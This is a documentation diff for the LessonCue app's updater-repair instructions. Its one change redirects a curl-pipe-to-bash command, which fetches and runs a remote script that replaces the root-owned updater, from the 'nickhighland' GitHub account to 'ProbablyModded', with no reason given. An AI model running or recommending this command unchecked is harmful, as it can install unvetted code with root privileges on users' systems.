@@ -75,7 +75,7 @@ Do not manually delete `/opt/lessoncue.previous`, `/var/lib/lessoncue/update-rol
 If an older installation repeatedly reports that it could not create the required pre-update snapshot, repair only the protected updater from the newest signed release, then retry from **Settings → Software updates**:
 
 ```bash
-curl -fsSL https://github.com/nickhighland/lessoncue/releases/latest/download/install-lessoncue.sh | bash -s -- --repair-updater
+curl -fsSL https://github.com/ProbablyModded/lessoncue/releases/latest/download/install-lessoncue.sh | bash -s -- --repair-updater
 ```
 
 This verifies the release's Ed25519 signature and archive checksum before executing the signed repair helper. It replaces the root-owned updater and its systemd units while leaving the LessonCue application, database, configuration, and media in place. Future updates hand the operation to the verified updater bundled in the target release before snapshotting, preventing the same bootstrap failure from recurring.
